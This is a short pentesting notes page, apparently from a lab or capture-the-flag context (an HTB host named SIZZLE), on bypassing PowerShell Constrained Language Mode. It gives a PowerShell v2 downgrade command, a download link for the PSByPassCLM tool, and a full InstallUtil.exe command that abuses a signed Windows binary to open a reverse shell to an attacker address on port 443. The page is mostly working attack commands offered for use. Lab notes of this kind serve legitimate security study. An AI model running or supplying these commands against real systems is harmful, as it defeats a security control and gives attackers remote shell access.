---
description: methods to bypass powershell constrained language mode
---

# powershell constrained language byass

Constrained Language Mode in short locks down the nice features of Powershell usually required for complex attacks to be carried out.

To view if you are in ConstrainedLangauage: 

```text
PS htb\amanda@SIZZLE v2.0.50727> $executioncontext.sessionstate.languagemode 
ConstrainedLanguage 
```

## Powershell2 downgrade

You can try and bypass by downgrading to powershell v2:    

`powershell -version 2` 

## PSByPassCLM 

Download:  [https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe](https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe) 

Upload that as a.exe and run: 

`PS htb\amanda@SIZZLE Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe` 

\`\`

